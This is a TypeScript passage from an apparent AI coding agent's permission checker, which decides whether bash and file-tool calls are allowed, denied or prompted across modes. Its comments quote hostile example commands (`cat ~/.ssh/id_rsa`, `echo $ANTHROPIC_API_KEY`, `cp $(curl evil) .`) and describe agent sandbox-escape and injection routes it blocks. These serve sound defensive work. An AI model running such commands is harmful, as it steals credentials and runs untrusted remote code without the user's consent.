  private bashAutoAllowedBySandbox(toolName: string, input: Record<string, unknown>): boolean {
    if (toolName !== 'bash' || typeof input.command !== 'string') return false;
    if (this.sandboxPolicy?.autoAllowBashIfSandboxed !== true) return false;
    // dangerouslyDisableSandbox cannot override the sandbox, but if the model asked for
    // it we still prompt (handled earlier in check); never silently auto-allow here.
    if (input.dangerouslyDisableSandbox === true) return false;
    // Container mode: the container is the boundary → every command is auto-allowed.
    if (this.sandboxPolicy.mode === 'container') return true;
    // Host mode: auto-allow only the commands that WILL be host-sandboxed; others
    // fall through to the normal prompt.
    return this.sandboxEligibilityResolver?.(input.command) === true;
  }

  // -------------------------------------------------------------------------
  // Auto-mode / classifier denial store (recency-ordered, bounded, displayable)
  // -------------------------------------------------------------------------

  private _recentDenials: RecentDenial[] = [];
  private readonly MAX_RECENT_DENIALS = 100;

  /** Recency-ordered (newest-first) snapshot of recorded denials. */
  getRecentDenials(): readonly RecentDenial[] {
    return this._recentDenials;
  }

  /** Clear the recorded-denial log (but not the circuit-breaker counters). */
  clearRecentDenials(): void {
    this._recentDenials = [];
  }

  // -------------------------------------------------------------------------
  // Core permission check
  // -------------------------------------------------------------------------

  /**
   * Sensitive-path safety check shared by the blanket-allow modes
   * (`auto-allow`/yolo and `bypassPermissions`). Returns true when the invocation
   * touches a credential path, a system directory, or a sensitive config path and
   * must therefore still prompt rather than be silently auto-allowed. Mirrors
   * the reference's safetyCheck, which fires in every mode.
   */
  private sensitivePathRequiresPrompt(
    toolName: string,
    input: Record<string, unknown>,
  ): boolean {
    if (toolName === 'bash' && typeof input.command === 'string') {
      if (commandTargetsCredentialPath(input.command)) return true;
      if (commandTargetsSystemDir(input.command)) return true;
      // A catastrophic rm/rmdir target (root, home, any direct child of root, a
      // drive root, a `/*` wildcard) must confirm even under a blanket auto-allow.
      if (commandHasDangerousRemoval(input.command)) return true;
    }
    if (toolName === 'bash' || toolName === 'file_edit' || toolName === 'file_write') {
      const pathArg = (input.file_path || input.command || '');
      if (typeof pathArg === 'string') {
        // Case-fold on case-insensitive filesystems so a `.SSH/`, `.Ami/`, or
        // `.AWS/` reference still matches the lowercase safety literals and cannot
        // fail-open past this blanket-allow guard (gap U003).
        const foldedArg = normalizeCaseForComparison(pathArg);
        for (const sp of SENSITIVE_SAFETY_PATHS) {
          if (foldedArg.includes(normalizeCaseForComparison(sp))) return true;
        }
      }
    }
    return false;
  }

  /**
   * Check whether a tool invocation is allowed, denied, or needs user input.
   */
  async check(
    toolName: string,
    input: Record<string, unknown>,
  ): Promise<'allow' | 'deny' | 'ask'> {
    // Clear any stale classifier-downgrade reason from a previous call so a verdict
    // this run that is NOT classifier-driven is never mis-attributed (the slot is set
    // only by applyAutoModeSafetyClassifier and consumed by deriveDecisionReason).
    this._pendingClassifierReason = undefined;

    // PARITY (additive): the env-gated synthetic permission-flow test fixture
    // (testing_permission) UNCONDITIONALLY triggers the permission prompt in every
    // mode — mirroring the reference's TestingPermissionTool.checkPermissions(), which
    // always returns {behavior:'ask'}. It is a side-effect-free, test-only tool whose
    // sole purpose is to drive the ask → allow/deny path deterministically. Hard stops
    // still win: deny-all (there is no interactive prompt to answer) denies, and an
    // explicit user deny rule denies; otherwise every mode asks (no standing allow rule
    // can silently auto-approve it). Placed first so no mode fast-path can bypass it.
    if (toolName === TESTING_PERMISSION_TOOL_NAME) {
      if (this.mode === 'deny-all') return 'deny';
      if (this.anyDenyMatches(toolName, input)) return 'deny';
      return 'ask';
    }

    // Hardline safety — unconditional, overrides all modes including auto-allow
    if (toolName === 'bash' && typeof input.command === 'string') {
      const hardline = detectHardlineCommand(input.command);
      if (hardline.blocked) return 'deny';

      // Disguised-bare-repo guard: running git from a cwd that has been made to look
      // like a bare git repo makes git treat the cwd as the git dir and execute
      // attacker-planted hooks (sandbox escape). Force an explicit prompt for any
      // git invocation from such a cwd — even under auto-allow/bypass — so the hook
      // execution can never be silently auto-allowed. deny-all still denies below.
      if (this.mode !== 'deny-all' &&
          commandInvokesGit(input.command) &&
          isDisguisedBareGitRepo()) {
        return 'ask';
      }
    }

    // Least-privilege capability ceiling (parity: the reference's forked-agent canUseTool).
    // A HARD cap on a forked/background sub-agent — enforced ahead of every mode, so a
    // non-read-only bash command or a write outside the confined roots is denied even
    // under auto-allow/bypass. Inert (never set) for the main engine.
    if (this.capabilityCeiling) {
      const denial = evaluateToolCeiling(
        this.capabilityCeiling,
        toolName,
        input,
        isReadOnlyBashCommand,
      );
      if (denial) return 'deny';
    }

    // dangerouslyDisableSandbox always requires explicit confirmation
    if (toolName === 'bash' && input.dangerouslyDisableSandbox === true) {
      if (this.mode === 'deny-all') return 'deny';
      return 'ask';
    }

    // Scratchpad carve-out (parity: the reference's per-session scratchpad read+write
    // allowlist, utils/permissions/filesystem.ts L384-424). A file read/write WITHIN
    // the operator-configured scratchpad dir (SUPERINFERENCE_SCRATCHPAD_DIR) is
    // auto-allowed without a prompt in EVERY mode — honoring the promise the system
    // prompt already makes to the model (buildScratchpadSection: "writable without a
    // permission prompt"), which the permission layer previously did not keep. An
    // explicit user deny rule still wins (anyDenyMatches below); the credential/system
    // forbidden guard inside isScratchpadToolCall still denies a mis-pointed dir; and
    // a scratchpad target is never routed through the bash classifier (file tools only),
    // so this cannot widen command execution.
    if (this.isScratchpadToolCall(toolName, input) && !this.anyDenyMatches(toolName, input)) {
      return 'allow';
    }

    // autoAllowBashIfSandboxed (the reference-parity, OPT-IN): when the policy runs every
    // bash command inside a container, the container — not the prompt — is the
    // safety boundary (the host filesystem is not mounted), so an operator who set
    // sandbox.autoAllowBashIfSandboxed=true wants bash to run without a prompt in
    // the normally prompt-driven modes (ask / acceptEdits). In HOST mode only the
    // commands that WILL be host-sandboxed take this path; sandbox-incompatible ones
    // fall through to the normal prompt. Hardline blocks and dangerouslyDisableSandbox
    // (both above) and explicit user deny rules still win; deny-all/plan keep denying
    // and auto-allow/bypass already allow, so this only changes behavior in
    // ask/acceptEdits.
    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
        this.bashAutoAllowedBySandbox(toolName, input) &&
        !this.anyDenyMatches(toolName, input) &&
        // HOST mode still prompts for sensitive-path reads/writes: the host filesystem
        // IS reachable under the unshare sandbox (unlike container mode where it is not
        // mounted), so a credential read / system-dir write must not silently bypass the
        // prompt. Container mode keeps the full no-prompt behavior (FS not mounted).
        (this.sandboxPolicy?.mode === 'container' || !this.sensitivePathRequiresPrompt(toolName, input))) {
      return 'allow';
    }

    // Auto-allow plain `--help` invocations (parity: the reference's `isHelpCommand`
    // prefix-extraction bypass). A bare help request (`git commit --help`,
    // `python --help`) is side-effect-free, so it never needs a prompt in the
    // rule-evaluated modes — the user is not asked to grant a rule just to read a
    // tool's help text. Hardline blocks (handled above) and explicit user deny
    // rules still win; deny-all/plan keep denying; help forms routed through an
    // unsafe backend (`man -l`, `git help --web`) are excluded by isHelpCommand.
    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
        toolName === 'bash' && typeof input.command === 'string' &&
        isHelpCommand(input.command) &&
        !this.anyDenyMatches(toolName, input)) {
      return 'allow';
    }

    // Fast path: mode-level overrides — but in auto-allow mode, explicit
    // deny rules still fire (Gap #32). M9: a matching deny UNCONDITIONALLY wins
    // over the auto-allow, regardless of rule order (an earlier allow can no
    // longer shadow a later deny). paramPattern rules stay skipped on this
    // fast-path (unchanged behavior); everything else is auto-allowed.
    if (this.mode === 'auto-allow') {
      if (this.anyDenyMatches(toolName, input, /* skipParamPattern */ true)) return 'deny';
      // Sensitive-path safety still fires even under yolo/auto-allow: a bash
      // credential read/exfil or system-dir write, or an edit to a sensitive
      // config path, must still prompt — mirroring the reference's safetyCheck (which
      // is applied in every mode) and the bypassPermissions handling below. This
      // closes the asymmetry where `cat ~/.ssh/id_rsa` was auto-allowed in yolo
      // even though file_read of the same path is forbidden.
      if (this.sensitivePathRequiresPrompt(toolName, input)) return 'ask';
      return this.applyAutoModeSafetyClassifier(toolName, input);
    }
    // Screened autonomy: `auto` runs tool calls without a prompt (like auto-allow)
    // but screens EACH call for risk + prompt injection first, blocking the risky
    // ones so an autonomous run is bounded without interrupting the user. Ordering
    // mirrors the other autonomous branches: explicit user deny/ask rules win, then
    // sensitive-path safety prompts, then the per-call screen decides allow vs block
    // ({@link screenAutoModeToolCall}). A blocked call returns `deny`, which the
    // engine reports back so the model can try a different approach (the reference's auto
    // mode block-and-retry fallback).
    if (this.mode === 'auto') {
      if (this.anyDenyMatches(toolName, input, /* skipParamPattern */ true)) return 'deny';
      if (this.anyAskMatches(toolName, input)) return 'ask';
      if (this.sensitivePathRequiresPrompt(toolName, input)) return 'ask';
      // Static screen first; only when IT allows does the injected classifier get a
      // chance to tighten the verdict (a screen-blocked call is already `deny`/`ask`).
      const screened = screenAutoModeToolCall(toolName, input).decision;
      if (screened !== 'allow') return screened;
      return this.applyAutoModeSafetyClassifier(toolName, input);
    }
    if (this.mode === 'deny-all') return 'deny';

    if (this.mode === 'bypassPermissions') {
      // Explicit user deny rules are BYPASS-IMMUNE: a `{tool, action:'deny'}` rule
      // fires even in bypassPermissions mode, before the blanket auto-allow — so a
      // user's hard stop is never silently overridden (the reference orders deny/safety
      // checks before the bypass allow, permissions.ts L1169-1281).
      if (this.anyDenyMatches(toolName, input)) return 'deny';
      // User-configured content-specific `ask` rules are ALSO bypass-immune: a
      // `{tool, action:'ask'}` rule still prompts, before the blanket allow, so an
      // explicit "always confirm this" is never silently overridden by bypass mode.
      if (this.anyAskMatches(toolName, input)) return 'ask';
      if (this.sensitivePathRequiresPrompt(toolName, input)) return 'ask';
      return this.applyAutoModeSafetyClassifier(toolName, input);
    }

    if (this.mode === 'plan') {
      // A plan run that was STARTED while bypass was available inherits bypass
      // semantics instead of the read-only allowlist (parity: the reference's
      // shouldBypassPermissions = mode==='plan' && isBypassPermissionsModeAvailable).
      // Explicit user deny/ask rules and sensitive-path safety still win first —
      // identical ordering to the bypassPermissions branch above — so an inherited
      // bypass never silently overrides a hard stop.
      if (this._bypassModeAvailable) {
        if (this.anyDenyMatches(toolName, input)) return 'deny';
        if (this.anyAskMatches(toolName, input)) return 'ask';
        if (this.sensitivePathRequiresPrompt(toolName, input)) return 'ask';
        return this.applyAutoModeSafetyClassifier(toolName, input);
      }
      const readOnlyTools = new Set(['file_read', 'grep', 'glob', 'list_dir', 'web_fetch', 'web_search', 'search_symbols', 'tool_search', 'task_tracker', 'task_list', 'task_output', 'todo_read']);
      if (readOnlyTools.has(toolName)) return 'allow';
      // Auto-mode-during-plan (reconciled from the `useAutoModeDuringPlan` setting by
      // transitionPlanAutoMode): instead of hard-denying every non-read-only tool, the
      // call is SCREENED by the auto-mode classifier — screened autonomy while planning
      // — so a safe action can proceed without leaving plan mode. Ordering mirrors the
      // `auto` branch: explicit user deny/ask rules win, then sensitive-path safety,
      // then the static screen, then the injected classifier. Dangerous code-exec
      // `allow` rules were already stripped on activation so a prefix-rule grant cannot
      // bypass the screen. Parity: the reference's auto mode active during plan.
      if (this._autoModeActiveDuringPlan) {
        if (this.anyDenyMatches(toolName, input, /* skipParamPattern */ true)) return 'deny';
        if (this.anyAskMatches(toolName, input)) return 'ask';
        if (this.sensitivePathRequiresPrompt(toolName, input)) return 'ask';
        const screened = screenAutoModeToolCall(toolName, input).decision;
        if (screened !== 'allow') return screened;
        return this.applyAutoModeSafetyClassifier(toolName, input);
      }
      return 'deny';
    }

    // acceptEdits: auto-allow file-mutating tools and safe bash
    if (this.mode === 'acceptEdits') {
      if (ACCEPT_EDITS_EDIT_TOOLS.has(toolName)) {
        // Build-config files can be weaponized for supply-chain attacks —
        // require explicit approval even in acceptEdits mode.
        const filePath = (input.file_path || input.path || '') as string;
        if (filePath && isBuildConfigFile(filePath)) return 'ask';
        // The agent's OWN config/settings/IDE/git dirs are a self-reconfig /
        // prompt-injection vector — never silently auto-edit them.
        if (filePath && isAgentConfigPath(filePath)) return 'ask';
        // A path-canonicalization bypass (ADS, 8.3 short name, trailing dot,
        // UNC, triple-dot, DOS device) could sneak past the basename guards above.
        if (filePath && hasSuspiciousPathPattern(filePath)) return 'ask';
        return 'allow';
      }
      // A compound TOCTOU shape (archive-before-git, symlink, or cwd-desync) must
      // never be silently auto-allowed even when its segments individually classify
      // 'safe' / edit-adjacent — a `cd ~/.ssh && cat id_rsa` reads 'safe' (cat) but
      // resolves the relative operand against the just-entered secret dir. Skip the
      // acceptEdits early-allow for those and fall through to the shared toctou guard
      // below, which forces an explicit ask.
      if (toolName === 'bash' && typeof input.command === 'string' &&
          this.bashToctouEscalation(input.command) === null) {
        const classification = this.classifyBashCommand(input.command);
        if (classification === 'safe') return 'allow';
        // acceptEdits also auto-allows benign edit-adjacent filesystem mutations
        // (mkdir/touch/mv/cp/sed) — the reference's ACCEPT_EDITS_ALLOWED_COMMANDS — and
        // their PowerShell counterpart (Set-Content/Add-Content/Clear-Content and
        // aliases — the reference's ACCEPT_EDITS_ALLOWED_CMDLETS, minus remove-item which
        // AMI keeps gated) — but only when the command is not destructive
        // (rm/rmdir/Remove-Item stay gated) and does not touch a credential or
        // system path (those keep their explicit prompt).
        if (classification !== 'destructive' &&
            (isAcceptEditsFilesystemMutation(input.command) ||
             isAcceptEditsPowerShellWrite(input.command)) &&
            !commandTargetsCredentialPath(input.command) &&
            !commandTargetsSystemDir(input.command)) {
          return 'allow';
        }
      }
    }

    // Check if this exact invocation was already denied
    const key = denialKey(toolName, input);
    if (this.deniedCommands.has(key)) return 'deny';

    // Determine if this is a destructive tool call (used to guard allow rules
    // from auto-approving irreversible operations via wildcards). Covers a
    // destructive bash command AND any tool whose injected isDestructive resolver
    // flags this input (parity: the reference's generic Tool.isDestructive(input)).
    const isDestructiveToolCall = this.mode === 'ask' && this.isDestructiveToolUse(toolName, input);

    // Code-execution allow-rule downgrade: a matched over-broad interpreter /
    // package-runner / shell allow rule (e.g. Bash(python:*), Bash(npx:*),
    // Bash(bash:*)) grants arbitrary code execution, bypassing the command
    // classifier. Unlike isDestructiveBash (which keys off the COMMAND's
    // classification and fires only in 'ask'), this keys off the matched RULE's
    // shape and fires in BOTH rule-evaluated modes ('ask' and 'acceptEdits'), so
    // such a rule is downgraded to an explicit prompt instead of silently
    // auto-approving arbitrary code. Mirrors the reference's dangerous-permission strip.
    const codeExecDowngradeMode = (this.mode === 'ask' || this.mode === 'acceptEdits') &&
      toolName === 'bash' && typeof input.command === 'string';

    // Credential/secret access always confirms in rule-evaluated modes (ask and
    // acceptEdits), even under a wildcard allow — unless there is an explicit
    // deny rule (which must still win below).
    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
        toolName === 'bash' && typeof input.command === 'string' &&
        commandTargetsCredentialPath(input.command) && !this.hasExplicitDeny(toolName, input)) {
      return 'ask';
    }
    // System directory write guard — commands that write to /etc, /usr, /boot,
    // etc. always require explicit approval, even under a wildcard allow rule.
    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
        toolName === 'bash' && typeof input.command === 'string' &&
        commandTargetsSystemDir(input.command)) {
      return 'ask';
    }
    // Dangerous-removal guard — an rm/rmdir targeting a catastrophic path (root,
    // home, any direct child of root, a drive root, a `/*` wildcard) ALWAYS
    // confirms explicitly and can never be auto-approved by a wildcard allow rule.
    // An explicit deny rule still wins (resolved below), so it is excluded here.
    // Mirrors the reference's checkDangerousRemovalPaths (tools/BashTool/pathValidation.ts).
    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
        toolName === 'bash' && typeof input.command === 'string' &&
        commandHasDangerousRemoval(input.command) && !this.hasExplicitDeny(toolName, input)) {
      return 'ask';
    }

    // Compound-command TOCTOU guard — an archive-extraction-before-git compound
    // or a symlink-creating compound always confirms in rule-evaluated modes
    // (ask/acceptEdits), even under a wildcard allow rule, because the auto-allow
    // paths cannot see the runtime repo/path redirection those shapes introduce
    // (the archive is unpacked, or the link is created, AFTER the permission
    // decision and BEFORE the later command runs). Mirrors the reference's
    // GIT_SAFETY_ARCHIVE_EXTRACTORS + hasSymlinkCreate gates. An explicit deny
    // still wins via the unconditional deny scan below.
    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
        toolName === 'bash' && typeof input.command === 'string' &&
        this.bashToctouEscalation(input.command) !== null &&
        !this.hasExplicitDeny(toolName, input)) {
      return 'ask';
    }

    // Policy memo: return cached decision for this exact tool+input if available
    if (this._memo) {
      const inputHash = this._hashInput(input);
      const cached = this._memo.get(toolName, inputHash);
      if (cached !== null) return cached;
    }

    // M9: a matching deny rule UNCONDITIONALLY wins over any allow/ask, regardless
    // of rule order. Scan the whole rule list for a deny first; only if none matches
    // do allow/ask rules get evaluated in order (first match wins) below.
    if (this.anyDenyMatches(toolName, input)) {
      if (this._memo) this._memo.set(toolName, this._hashInput(input), 'deny');
      return 'deny';
    }

    // argLeaksValue guard — an `allow` rule must NOT auto-approve a bash command
    // whose ARGUMENTS expand a non-vetted variable (secret exfil, e.g.
    // `echo $ANTHROPIC_API_KEY`) or a command substitution (arbitrary code, e.g.
    // `cp $(curl evil) .`): the rule asserts the COMMAND is safe, not that
    // arbitrary expansion through it is. Fires in the rule-evaluated modes (deny
    // already resolved above and still wins), forcing an explicit prompt. Mirrors
    // the reference's argLeaksValue allow-path gate. A vetted SAFE_ENV_VARS reference
    // (`$NODE_ENV`) is not a leak and stays auto-approvable.
    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
        toolName === 'bash' && typeof input.command === 'string' &&
        bashCommandArgLeaksValue(input.command)) {
      if (this._memo) this._memo.set(toolName, this._hashInput(input), 'ask');
      return 'ask';
    }

    // Evaluate allow/ask rules in order (first match wins). Deny rules were already
    // resolved above and unconditionally win, so they are skipped here.
    for (const rule of this.rules) {
      if (rule.action === 'deny') continue;
      const toolMatches = this.toolNameMatches(rule.tool, toolName);
      if (!toolMatches) continue;
      // Tool(param:value) matching — all named params must match their globs.
      if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;

      if (rule.pattern) {
        const inputStr = this.inputToString(toolName, input);
        const matched = (toolName === 'bash' && typeof input.command === 'string'
          ? matchBashPattern(rule.pattern, inputStr, rule.action)
          : matchPattern(rule.pattern, inputStr))
          // ADDITIVE: a rooted file-rule pattern (`//abs/**`, `~/x`, `/src/**`) that
          // the raw matcher cannot resolve still matches its named file per-root.
          || this.matchFilePathRuleWithRoot(rule, toolName, input);
        if (matched) {
          const effective = (rule.action === 'allow' &&
            (isDestructiveToolCall || (codeExecDowngradeMode && this.isDangerousCodeExecAllow(rule)))) ? 'ask' : rule.action;
          if (this._memo) this._memo.set(toolName, this._hashInput(input), effective);
          return effective;
        }
      } else {
        // No pattern -- rule applies to the whole tool (param match already gated above).
        // A content-less (tool-wide) rule is NOT a code-exec prefix, so only the
        // destructive-command downgrade applies here.
        const effective = (rule.action === 'allow' && isDestructiveToolCall) ? 'ask' : rule.action;
        if (this._memo) this._memo.set(toolName, this._hashInput(input), effective);
        return effective;
      }
    }

    // Default: 'ask' mode means non-read-only tools require a prompt
    if (this._memo) this._memo.set(toolName, this._hashInput(input), 'ask');
    return 'ask';
  }

  /**
   * Like {@link check} but also returns a STRUCTURED reason explaining the verdict,
   * so a UI can tell the user WHY approval is required (or why it was denied)
   * instead of a bare "needs approval". Reuses check() for the decision (single
   * source of truth — no parallel decision path) and derives the reason from the
   * same guard predicates. `reason`/`message` are undefined for an `allow`.
   */
  async checkWithReason(
    toolName: string,
    input: Record<string, unknown>,
  ): Promise<{
    decision: 'allow' | 'deny' | 'ask';
    reason?: PermissionDecisionReason;
    message?: string;
    /**
     * Pre-baked "always allow X" rule candidates ({@link buildPermissionSuggestions})
     * a prompt can offer for one-click acceptance (the reference's
     * `permissionResult.suggestions`). Omitted when nothing safe can be suggested.
     */
    suggestions?: PermissionUpdate[];
    /**
     * A hard, turn-aborting denial: when set the whole agentic turn should be
     * interrupted, not just the single tool call blocked. Set for `hardline`
     * (blocked-command) denials. Mirrors the reference's deny-branch `interrupt` flag
     * (PermissionResultSchema). Omitted otherwise.
     */
    interrupt?: boolean;
    /**
     * For a COMPOUND bash command (`a && b | c`) that did not auto-allow, the
     * per-segment verdict map: each pipe/`&&`/`;` segment evaluated INDEPENDENTLY
     * through {@link check} so a prompt/executor can show WHICH specific segment
     * forced the ask/deny instead of collapsing the whole chain to one verdict.
     * The aggregate `decision` above stays authoritative (deny-wins); this map is
     * purely additive diagnostics. Omitted for single (non-compound) commands,
     * non-bash tools, and the auto-allow fast path. Mirrors the reference's
     * BashPermissionRequest `subcommandResults: Map<string, PermissionResult>`
     * (tools/BashTool/bashCommandHelpers.ts L84-156).
     */
    subcommandResults?: Record<string, 'allow' | 'deny' | 'ask'>;
    /**
     * The EXACT path that tripped the gate, when the ask/deny was triggered by a
     * specific filesystem target (an out-of-workspace path, or a file-tool's
     * `file_path`/`path`). Lets a prompt/denial name the offending path ("… for
     * /etc/hosts") instead of only the whole tool call. Mirrors the reference's
     * `PermissionAskDecision.blockedPath` / `PermissionResult.blockedPath`
     * (types/permissions.ts L196-266). Omitted when no single path is at fault
     * (e.g. a mode-wide prompt, a bash-rule deny) and always omitted on `allow`.
     */
    blockedPath?: string;
  }> {
    const decision = await this.check(toolName, input);
    if (decision === 'allow') return { decision };
    const reason = this.deriveDecisionReason(toolName, input, decision);
    const suggestions = buildPermissionSuggestions(toolName, input);
    const subcommandResults = await this.evaluateCompoundSubcommands(toolName, input);
    const blockedPath = this.deriveBlockedPath(toolName, input, reason);
    return {
      decision,
      reason,
      message: createPermissionRequestMessage(reason, permissionPromptToolType(toolName)),
      ...(suggestions.length > 0 ? { suggestions } : {}),
      ...(decision === 'deny' && reason.type === 'hardline' ? { interrupt: true } : {}),
      ...(subcommandResults ? { subcommandResults } : {}),
      ...(blockedPath ? { blockedPath } : {}),
    };
  }

  /**
   * The specific filesystem path a non-allow verdict is about, or `undefined`
   * when the verdict is not path-specific. Prefers the structured `workingDir`
   * reason's offending path; otherwise falls back to a file tool's own
   * `file_path`/`path` input. Pure read — never mutates. Parity with the reference's
   * `blockedPath`, surfaced so a prompt/denial can name the exact path.
   */
  private deriveBlockedPath(
    toolName: string,
    input: Record<string, unknown>,
    reason: PermissionDecisionReason,
  ): string | undefined {
    if (reason.type === 'workingDir') return reason.path;
    const filePath = input.file_path ?? input.path;
    return typeof filePath === 'string' && filePath.length > 0 ? filePath : undefined;
  }

  /**
   * Structured, machine-readable reason WHY a tool call was AUTO-ALLOWED — the
   * introspection counterpart to {@link deriveDecisionReason} (which only explains
   * ask/deny). Call AFTER {@link check}/{@link checkWithReason} returned `allow`.
   * Attribution mirrors {@link check}'s own precedence — the only two ways AMI ever
   * auto-approves a call:
   *  1. a standing `allow` RULE matched → `{ type:'rule', action:'allow', ruleValue }`
   *     (reuses {@link matchedAllowRule}, the single rule-provenance source);
   *  2. otherwise the active permission MODE granted it (bypassPermissions / auto-allow /
   *     acceptEdits / plan read-only) → `{ type:'mode', mode }` — parity with the reference's
   *     auto-allow `decisionReason: { type:'mode', mode:'acceptEdits' }` (PowerShellTool
   *     modeValidation.ts L396-403). (The default `ask` mode never auto-allows a rule-less
   *     call, so there is no third, classifier-only arm to attribute.)
   * So an audit/introspection layer can record the BASIS of an auto-approval
   * (explicit rule vs permission mode), which a bare `'allow'` loses.
   */
  explainAllow(toolName: string, input: Record<string, unknown>): PermissionDecisionReason {
    const ruleLabel = this.matchedAllowRule(toolName, input);
    if (ruleLabel) return { type: 'rule', action: 'allow', ruleValue: ruleLabel };
    return { type: 'mode', mode: this.mode };
  }

  /**
   * Evaluate EACH segment of a compound bash command independently through
   * {@link check}, returning a `{ segment: verdict }` map — the data a UI/executor
   * needs to attribute a compound command's ask/deny to the exact offending
   * segment (parity: the reference's per-segment `subcommandResults`, deny-wins
   * aggregation). Returns `undefined` for a non-bash tool, a non-string command,
   * or a single (non-compound) command — cases with nothing to disambiguate.
   * Segments are de-duplicated (a repeated segment is evaluated once).
   */
  private async evaluateCompoundSubcommands(
    toolName: string,
    input: Record<string, unknown>,
  ): Promise<Record<string, 'allow' | 'deny' | 'ask'> | undefined> {
    if (toolName !== 'bash' || typeof input.command !== 'string') return undefined;
    const segments = splitCompoundCommand(input.command);
    if (segments.length <= 1) return undefined;
    const results: Record<string, 'allow' | 'deny' | 'ask'> = {};
    for (const segment of segments) {
      if (segment in results) continue;
      results[segment] = await this.check('bash', { ...input, command: segment });
    }
    return results;
  }

  /** Best-effort attribution of a deny/ask verdict to a structured reason. */
  private deriveDecisionReason(
    toolName: string,
    input: Record<string, unknown>,
    decision: 'deny' | 'ask',
  ): PermissionDecisionReason {
    // The verdict came from the injected auto-mode safety classifier (check() set the
    // carry-slot on its downgrade): attribute it to the classifier so the prompt /
    // denial message explains WHY, and consume the slot so it never leaks to a later
    // non-classifier verdict. Only set on a classifier-driven downgrade, so its mere
    // presence is authoritative here.
    const classifierReason = this._pendingClassifierReason;
    this._pendingClassifierReason = undefined;
    if (classifierReason !== undefined) {
      return { type: 'classifier', ...(classifierReason ? { reason: classifierReason } : {}) };
    }
    const command = typeof input.command === 'string' ? input.command : undefined;
    if (toolName === 'bash' && command) {
      const hardline = detectHardlineCommand(command);
      if (hardline.blocked) return { type: 'hardline', description: hardline.description ?? 'blocked command' };
    }
    // Sandbox opt-out: a bash call that set `dangerouslyDisableSandbox` is gated
    // because it wants to run UNSANDBOXED, not because of the mode — attribute the
    // ask to `sandboxOverride` so the prompt explains it needs to bypass the sandbox
    // (parity with the reference's sandboxOverride decisionReason). Only on an `ask`; a
    // deny-all deny stays attributed to the mode below.
    if (decision === 'ask' && toolName === 'bash' && input.dangerouslyDisableSandbox === true) {
      return { type: 'sandboxOverride' };
    }
    // An explicit matching rule.
    for (const rule of this.rules) {
      if (!this.toolNameMatches(rule.tool, toolName)) continue;
      if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
      const matches = rule.pattern
        ? ((toolName === 'bash' && command
            ? matchBashPattern(rule.pattern, command, rule.action)
            : matchPattern(rule.pattern, this.inputToString(toolName, input)))
            // Attribute a verdict produced by the rooted file-rule resolution (above)
            // to the rule that matched, so the reason is not left unattributed.
            || this.matchFilePathRuleWithRoot(rule, toolName, input))
        : true;
      if (matches && (rule.action === decision)) {
        return {
          type: 'rule',
          action: rule.action,
          ruleValue: rule.pattern ? `${rule.tool}(${rule.pattern})` : rule.tool,
          source: rule.reason,
          // Machine-readable provenance so a managed (policySettings) rule can
          // suppress the "update your rules" remediation hint downstream.
          ...(rule.source ? { ruleSource: rule.source } : {}),
        };
      }
    }
    // Safety checks (credential / system-dir / suspicious-path / config files).
    if (toolName === 'bash' && command) {
      if (commandTargetsCredentialPath(command)) {
        return { type: 'safetyCheck', check: 'credential', message: 'Command accesses a credential/secret path and requires approval' };
      }
      if (commandTargetsSystemDir(command)) {
        return { type: 'safetyCheck', check: 'systemDir', message: 'Command writes to a system directory and requires approval' };
      }
      if (this.classifyBashCommand(command) === 'destructive') {
        // Surface the SPECIFIC human-readable warning (parity with the reference's
        // getDestructiveCommandWarning) when the command matches a known signature,
        // so the prompt says WHY it is destructive; else a generic line.
        const warning = getDestructiveCommandWarning(command);
        return {
          type: 'safetyCheck', check: 'destructive',
          message: warning ? `${warning} — approval required` : 'Command is destructive and requires approval',
        };
      }
      const toctou = this.bashToctouEscalation(command);
      if (toctou !== null) {
        return { type: 'safetyCheck', check: 'toctou', message: `Command requires approval: ${toctou}` };
      }
      // argLeaksValue: the ask verdict came from an allow rule being withheld
      // because an argument expands a non-vetted variable / command substitution.
      if (decision === 'ask' && (this.mode === 'ask' || this.mode === 'acceptEdits') &&
          bashCommandArgLeaksValue(command)) {
        return {
          type: 'safetyCheck', check: 'argLeak',
          message: 'Command expands a variable or command substitution its allow rule did not vet and requires approval',
        };
      }
      // Code-execution allow-rule downgrade: the ask verdict came from a matched
      // over-broad interpreter / package-runner / shell allow rule, not the mode.
      if (decision === 'ask' && (this.mode === 'ask' || this.mode === 'acceptEdits')) {
        const codeExecRule = this.matchingCodeExecAllowRule(input, command);
        if (codeExecRule) {
          return {
            type: 'safetyCheck', check: 'codeExec',
            message: `Allow rule "${codeExecRule.tool}(${codeExecRule.pattern})" grants arbitrary code execution and requires approval`,
          };
        }
      }
    }
    // Generic destructive-tool downgrade: a non-bash tool whose isDestructive
    // resolver flagged this input had its matched `allow` rule downgraded to an
    // `ask` in {@link check}. Attribute that prompt to the destructive safetyCheck
    // (same reason code as a destructive bash command) rather than the bare mode.
    if (decision === 'ask' && this.mode === 'ask' && toolName !== 'bash' &&
        this.toolDestructiveResolver?.(toolName, input) === true) {
      return { type: 'safetyCheck', check: 'destructive', message: 'Tool call is destructive and requires approval' };
    }
    const filePath = (input.file_path || input.path) as string | undefined;
    if (filePath) {
      if (isBuildConfigFile(filePath)) return { type: 'safetyCheck', check: 'buildConfig', message: 'Edit targets a build/CI config file and requires approval' };
      if (isAgentConfigPath(filePath)) return { type: 'safetyCheck', check: 'agentConfig', message: "Edit targets the agent's own config and requires approval" };
      if (hasSuspiciousPathPattern(filePath)) return { type: 'safetyCheck', check: 'suspiciousPath', message: 'Path uses a canonicalization-bypass pattern and requires approval' };
      // Out-of-workspace target: the path is outside the launch cwd and every
      // user-granted read root, so it needs explicit consent regardless of the
      // mode — attribute the ask to `workingDir` (parity with the reference's workingDir
      // decisionReason) so the prompt can explain WHERE the boundary is and offer
      // /add-dir, instead of a generic "mode requires approval".
      if (decision === 'ask' && this.classifyReadAccess(filePath, process.cwd()) === 'prompt') {
        return {
          type: 'workingDir',
          path: filePath,
          reason: `"${filePath}" is outside the workspace and requires approval to access`,
        };
      }
    }
    // Fall back to the mode.
    return { type: 'mode', mode: this.mode };
  }

  // -------------------------------------------------------------------------
